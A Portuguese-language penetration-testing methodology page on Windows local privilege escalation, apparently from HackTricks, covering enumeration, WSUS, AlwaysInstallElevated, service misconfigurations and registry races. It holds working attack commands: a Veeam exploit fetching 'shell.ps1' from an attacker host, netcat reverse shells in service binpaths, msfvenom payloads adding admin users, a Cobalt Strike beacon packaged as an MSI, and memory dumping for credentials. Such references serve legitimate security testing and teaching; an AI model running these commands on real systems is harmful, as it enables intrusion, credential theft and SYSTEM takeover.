# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Melhor ferramenta para procurar vetores de Windows local privilege escalation:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Teoria inicial do Windows

### Access Tokens

**Se você não sabe o que são Windows Access Tokens, leia a seguinte página antes de continuar:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Consulte a seguinte página para mais informações sobre ACLs - DACLs/SACLs/ACEs:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Se você não sabe o que são integrity levels no Windows, leia a seguinte página antes de continuar:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Security Controls

Existem diferentes coisas no Windows que podem **impedir você de enumerar o sistema**, executar executables ou até mesmo **detectar suas atividades**. Você deve **ler** a seguinte **página** e **enumerar** todos esses **mecanismos de defesa** antes de começar a enumeração de privilege escalation:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Admin Protection / UIAccess silent elevation

Processos UIAccess iniciados através de `RAiLaunchAdminProcess` podem ser abusados para alcançar High IL sem prompts quando as verificações de secure-path do AppInfo são contornadas. Veja o fluxo dedicado de bypass de UIAccess/Admin Protection aqui:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

A propagação do registro de accessibility do Secure Desktop pode ser abusada para uma escrita arbitrária no registro do SYSTEM (RegPwn):

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

## System Info

### Version info enumeration

Verifique se a versão do Windows tem alguma vulnerabilidade conhecida (verifique também os patches aplicados).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Version Exploits

Este [site](https://msrc.microsoft.com/update-guide/vulnerability) é útil para pesquisar informações detalhadas sobre vulnerabilidades de segurança da Microsoft. Este banco de dados tem mais de 4.700 vulnerabilidades de segurança, mostrando a **enorme superfície de ataque** que um ambiente Windows apresenta.

**No sistema**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas has watson embedded)_

**Localmente com informações do sistema**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Repos do Github de exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Environment

Alguma credencial/ informação Juicy salva nas variáveis de ambiente?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### Histórico do PowerShell
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### Arquivos de Transcript do PowerShell

Você pode aprender como ativar isso em [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

Detalhes das execuções do pipeline do PowerShell são registrados, abrangendo comandos executados, invocações de comandos e partes de scripts. No entanto, os detalhes completos da execução e os resultados de saída podem não ser capturados.

Para habilitar isso, siga as instruções na seção "Transcript files" da documentação, escolhendo **"Module Logging"** em vez de **"Powershell Transcription"**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Para ver os últimos 15 eventos dos logs do PowersShell, você pode executar:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

Um registro completo da atividade e do conteúdo integral da execução do script é capturado, garantindo que cada bloco de código seja documentado enquanto é executado. Esse processo preserva uma trilha de auditoria abrangente de cada atividade, valiosa para forense e para a análise de comportamento malicioso. Ao documentar toda a atividade no momento da execução, são fornecidos insights detalhados sobre o processo.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Os eventos de logging para o Script Block podem ser encontrados no Windows Event Viewer no caminho: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Para ver os últimos 20 eventos, você pode usar:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Configurações da Internet
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Unidades
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Você pode comprometer o sistema se as atualizações não forem solicitadas usando http**S**, mas http.

Você começa verificando se a rede usa uma atualização WSUS sem SSL executando o seguinte no cmd:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Ou o seguinte em PowerShell:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
Se você receber uma resposta como uma destas:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
E se `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` ou `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` for igual a `1`.

Então, **é explorável.** Se o último registry for igual a 0, então a entrada do WSUS será ignorada.

Para explorar essas vulnerabilities você pode usar tools como: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- Esses são scripts de exploits weaponized de MiTM para injetar updates 'fake' no tráfego WSUS sem SSL.

Leia a pesquisa aqui:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Leia o report completo aqui**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Basicamente, esta é a falha que este bug explora:

> Se tivermos o poder de modificar nosso proxy local de user, e o Windows Updates usa o proxy configurado nas settings do Internet Explorer, então temos o poder de executar [PyWSUS](https://github.com/GoSecure/pywsus) localmente para interceptar nosso próprio tráfego e executar code como um user elevado no nosso asset.
>
> Além disso, como o serviço WSUS usa as settings do current user, ele também usará o seu certificate store. Se gerarmos um self-signed certificate para o hostname do WSUS e adicionarmos esse certificate ao certificate store do current user, conseguiremos interceptar tráfego WSUS HTTP e HTTPS. O WSUS não usa mecanismos do tipo HSTS para implementar uma validação do tipo trust-on-first-use no certificate. Se o certificate apresentado for trusted pelo user e tiver o hostname correto, ele será aceito pelo service.

Você pode explorar essa vulnerability usando a tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (assim que ela for liberada).

## Third-Party Auto-Updaters and Agent IPC (local privesc)

Muitos enterprise agents expõem uma superfície IPC localhost e um canal de update privilegiado. Se o enrollment puder ser forçado para um attacker server e o updater confiar em uma rogue root CA ou em weak signer checks, um local user pode entregar um MSI malicioso que o serviço SYSTEM instala. Veja uma técnica generalizada (baseada na cadeia Netskope stAgentSvc – CVE-2025-0309) aqui:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)

Veeam B&R < `11.0.1.1261` expõe um service localhost em **TCP/9401** que processa mensagens controladas pelo attacker, permitindo comandos arbitrários como **NT AUTHORITY\SYSTEM**.

- **Recon**: confirme o listener e a versão, por exemplo, `netstat -ano | findstr 9401` e `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
- **Exploit**: coloque um PoC como `VeeamHax.exe` com as DLLs do Veeam necessárias no mesmo diretório, depois dispare um payload SYSTEM pelo socket local:
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
O serviço executa o comando como SYSTEM.
## KrbRelayUp

Uma vulnerabilidade de **local privilege escalation** existe em ambientes **domain** do Windows sob condições específicas. Essas condições incluem ambientes onde o **LDAP signing** não é aplicado, usuários possuem self-rights permitindo que configurem **Resource-Based Constrained Delegation (RBCD)**, e a capacidade de usuários criarem computers dentro do domain. É importante notar que esses **requirements** são atendidos usando **default settings**.

Encontre o **exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Para mais informações sobre o fluxo do ataque, veja [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**Se** esses 2 registers estiverem **enabled** (valor **0x1**), então usuários de qualquer privilege podem **install** (executar) `*.msi` files como NT AUTHORITY\\**SYSTEM**.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Payloads do Metasploit
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
Se você tiver uma sessão meterpreter, pode automatizar esta técnica usando o módulo **`exploit/windows/local/always_install_elevated`**

### PowerUP

Use o comando `Write-UserAddMSI` do power-up para criar dentro do diretório atual um binário MSI do Windows para escalar privilégios. Este script gera um instalador MSI pré-compilado que solicita a adição de um usuário/grupo (portanto, você precisará de acesso GIU):
```
Write-UserAddMSI
```
Apenas execute o binário criado para escalar privilégios.

### MSI Wrapper

Leia este tutorial para aprender como criar um MSI wrapper usando esta tools. Note que você pode encapsular um arquivo "**.bat**" se você **apenas** quiser **executar** **command lines**


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- **Generate** com Cobalt Strike ou Metasploit um **novo Windows EXE TCP payload** em `C:\privesc\beacon.exe`
- Abra o **Visual Studio**, selecione **Create a new project** e digite "installer" na caixa de busca. Selecione o projeto **Setup Wizard** e clique em **Next**.
- Dê ao projeto um nome, como **AlwaysPrivesc**, use **`C:\privesc`** como localização, selecione **place solution and project in the same directory**, e clique em **Create**.
- Continue clicando em **Next** até chegar ao passo 3 de 4 (choose files to include). Clique em **Add** e selecione o Beacon payload que você acabou de gerar. Em seguida, clique em **Finish**.
- Destaque o projeto **AlwaysPrivesc** no **Solution Explorer** e em **Properties**, altere **TargetPlatform** de **x86** para **x64**.
- Existem outras propriedades que você pode alterar, como **Author** e **Manufacturer**, que podem fazer o app instalado parecer mais legítimo.
- Clique com o botão direito no projeto e selecione **View > Custom Actions**.
- Clique com o botão direito em **Install** e selecione **Add Custom Action**.
- Clique duas vezes em **Application Folder**, selecione o arquivo **beacon.exe** e clique em **OK**. Isso garantirá que o beacon payload seja executado assim que o instalador for executado.
- Em **Custom Action Properties**, altere **Run64Bit** para **True**.
- Por fim, **build it**.
- Se o aviso `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` for exibido, certifique-se de definir a plataforma para x64.

### MSI Installation

Para executar a **instalação** do arquivo malicioso `.msi` em **background**:
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Para explorar esta vulnerabilidade você pode usar: _exploit/windows/local/always_install_elevated_

## Antivirus e Detectors

### Audit Settings

Essas configurações decidem o que está sendo **registrado**, então você deve prestar atenção
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding, é interessante saber para onde os logs são enviados
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** é projetado para o **gerenciamento de senhas do Administrador local**, garantindo que cada senha seja **única, aleatória e atualizada regularmente** em computadores ingressados em um domínio. Essas senhas são armazenadas com segurança no Active Directory e só podem ser acessadas por usuários que receberam permissões suficientes por meio de ACLs, permitindo que visualizem as senhas do admin local se estiverem autorizados.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Se estiver ativo, **senhas em texto claro são armazenadas no LSASS** (Local Security Authority Subsystem Service).\
[**Mais informações sobre WDigest nesta página**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### Proteção do LSA

A partir do **Windows 8.1**, a Microsoft introduziu proteção aprimorada para a Local Security Authority (LSA) para **bloquear** tentativas de processos não confiáveis de **ler sua memória** ou injetar código, reforçando ainda mais a segurança do sistema.\
[**Mais informações sobre a Proteção do LSA aqui**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credential Guard

**Credential Guard** foi introduzido no **Windows 10**. Seu objetivo é proteger as credenciais armazenadas em um dispositivo contra ameaças como ataques pass-the-hash.| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Credenciais em cache

**Credenciais de domínio** são autenticadas pela **Local Security Authority** (LSA) e utilizadas por componentes do sistema operacional. Quando os dados de logon de um usuário são autenticados por um pacote de segurança registrado, as credenciais de domínio para o usuário geralmente são estabelecidas.\
[**Mais informações sobre Cached Credentials aqui**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Usuários & Grupos

### Enumerar Usuários & Grupos

Você deve verificar se algum dos grupos aos quais você pertence tem permissões interessantes
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Grupos privilegiados

Se você **pertence a algum grupo privilegiado, pode ser capaz de escalar privilégios**. Saiba mais sobre grupos privilegiados e como abusar deles para escalar privilégios aqui:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Manipulação de token

**Saiba mais** sobre o que é um **token** nesta página: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Confira a seguinte página para **aprender sobre tokens interessantes** e como abusar deles:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Usuários logados / Sessões
```bash
qwinsta
klist sessions
```
### Pastas pessoais
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### Política de Senhas
```bash
net accounts
```
### Obter o conteúdo da área de transferência
```bash
powershell -command "Get-Clipboard"
```
## Processos em Execução

### Permissões de Arquivo e Pasta

Antes de tudo, ao listar os processos **verifique se há senhas dentro da linha de comando do processo**.\
Verifique se você consegue **sobrescrever algum binário em execução** ou se você tem permissões de escrita na pasta do binário para explorar possíveis [**ataques de DLL Hijacking**](dll-hijacking/index.html):
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Sempre verifique possíveis [**electron/cef/chromium debuggers** em execução, você pode abusá-los para escalar privilégios](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**Verificando permissões dos binários dos processos**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Verificando as permissões das pastas dos binários dos processos (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Extração de senhas da memória

Você pode criar um memory dump de um processo em execução usando **procdump** do sysinternals. Serviços como FTP têm as **credenciais em texto claro na memória**, tente fazer o dump da memória e ler as credenciais.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Aplicativos GUI inseguros

**Aplicativos executando como SYSTEM podem permitir que um usuário abra um CMD, ou navegue por diretórios.**

Exemplo: "Windows Help and Support" (Windows + F1), pesquise por "command prompt", clique em "Click to open Command Prompt"

## Services

Service Triggers permitem que o Windows inicie um service quando certas condições ocorrem (atividade de named pipe/RPC endpoint, eventos ETW, disponibilidade de IP, chegada de device, refresh de GPO, etc.). Mesmo sem direitos SERVICE_START, você frequentemente pode iniciar services privilegiados acionando seus triggers. Veja técnicas de enumeração e ativação aqui:

-
{{#ref}}
service-triggers.md
{{#endref}}

Obtenha uma lista de services:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### Permissões

Você pode usar **sc** para obter informações de um serviço
```bash
sc qc <service_name>
```
É recomendado ter o binário **accesschk** da _Sysinternals_ para verificar o nível de privilégio necessário para cada serviço.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
É recomendado verificar se "Authenticated Users" pode modificar algum serviço:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[Você pode baixar accesschk.exe para XP aqui](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Enable service

Se você estiver recebendo este erro (por exemplo com SSDPSRV):

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

Você pode habilitá-lo usando
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Leve em conta que o serviço upnphost depende de SSDPSRV para funcionar (para XP SP1)**

**Outra workaround** desse problema é executar:
```
sc.exe config usosvc start= auto
```
### **Modificar o caminho do binário do serviço**

No cenário em que o grupo "Authenticated users" possui **SERVICE_ALL_ACCESS** em um serviço, é possível modificar o binário executável do serviço. Para modificar e executar **sc**:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Reiniciar serviço
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Privilégios podem ser escalados por meio de várias permissões:

- **SERVICE_CHANGE_CONFIG**: Permite reconfigurar o binário do serviço.
- **WRITE_DAC**: Habilita a reconfiguração de permissões, levando à capacidade de alterar as configurações do serviço.
- **WRITE_OWNER**: Permite obter a propriedade e reconfigurar permissões.
- **GENERIC_WRITE**: Herda a capacidade de alterar as configurações do serviço.
- **GENERIC_ALL**: Também herda a capacidade de alterar as configurações do serviço.

Para a detecção e exploração dessa vulnerabilidade, o _exploit/windows/local/service_permissions_ pode ser utilizado.

### Services binaries weak permissions

**Verifique se você pode modificar o binário executado por um serviço** ou se você tem **permissões de escrita na pasta** onde o binário está localizado ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Você pode obter todos os binários executados por um serviço usando **wmic** (não em system32) e verificar suas permissões usando **icacls**:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Você também pode usar **sc** e **icacls**:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Permissões de modificação do registry de serviços

Você deve verificar se consegue modificar algum registry de serviço.\
Você pode **verificar** suas **permissões** sobre um **registry** de serviço fazendo:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Deve ser verificado se **Authenticated Users** ou **NT AUTHORITY\INTERACTIVE** possuem permissões `FullControl`. Se sim, o binário executado pelo serviço pode ser alterado.

Para alterar o Path do binário executado:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Registry symlink race to arbitrary HKLM value write (ATConfig)

Alguns recursos de Acessibilidade do Windows criam chaves **ATConfig** por usuário que depois são copiadas por um processo **SYSTEM** para uma chave de sessão em HKLM. Uma **symbolic link race** no registry pode redirecionar essa escrita privilegiada para **qualquer caminho em HKLM**, fornecendo uma primitive de **arbitrary HKLM value write**.

Locais-chave (exemplo: On-Screen Keyboard `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` lista os recursos de acessibilidade instalados.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` armazena a configuração controlada pelo usuário.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` é criada durante transições de logon/secure-desktop e é gravável pelo usuário.

Fluxo de abuso (CVE-2026-24291 / ATConfig):

1. Preencha o valor de **HKCU ATConfig** que você quer que o SYSTEM grave.
2. Acione a cópia do secure-desktop (por exemplo, **LockWorkstation**), que inicia o fluxo do broker de AT.
3. **Ganhe a race** colocando um **oplock** em `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`; quando o oplock disparar, substitua a chave **HKLM Session ATConfig** por um **registry link** para um alvo protegido em HKLM.
4. O SYSTEM grava o valor escolhido pelo atacante no caminho HKLM redirecionado.

Depois de obter arbitrary HKLM value write, faça pivot para LPE sobrescrevendo valores de configuração de serviço:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/command line)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Escolha um serviço que um usuário normal possa iniciar (por exemplo, **`msiserver`**) e acione-o após a escrita. **Nota:** a implementação pública do exploit **bloqueia a workstation** como parte da race.

Exemplo de tooling (RegPwn BOF / standalone):
```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```
### Permissões AppendData/AddSubdirectory no registry de Services

Se você tiver essa permissão sobre um registry, isso significa que **você pode criar sub registries a partir dele**. No caso de Windows services, isso é **suficiente para executar código arbitrário:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Se o caminho para um executável não estiver entre aspas, o Windows tentará executar cada final antes de um espaço.

Por exemplo, para o caminho _C:\Program Files\Some Folder\Service.exe_ o Windows tentará executar:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Liste todos os caminhos de serviço sem aspas, excluindo aqueles pertencentes a serviços internos do Windows:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Você pode detectar e explorar** essa vulnerabilidade com metasploit: `exploit/windows/local/trusted\_service\_path` Você pode criar manualmente um binary de service com metasploit:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Recovery Actions

Windows permite que usuários especifiquem ações a serem executadas se um serviço falhar. Esse recurso pode ser configurado para apontar para um binary. Se esse binary puder ser substituído, uma privilege escalation pode ser possível. Mais detalhes podem ser encontrados na [official documentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Applications

### Installed Applications

Verifique as **permissions of the binaries** (talvez você possa sobrescrever um e escalar privilégios) e das **folders** ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Write Permissions

Verifique se você consegue modificar algum arquivo de configuração para ler algum arquivo especial ou se consegue modificar algum binário que será executado por uma conta de Administrador (schedtasks).

Uma forma de encontrar permissões fracas de pastas/arquivos no sistema é fazendo:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
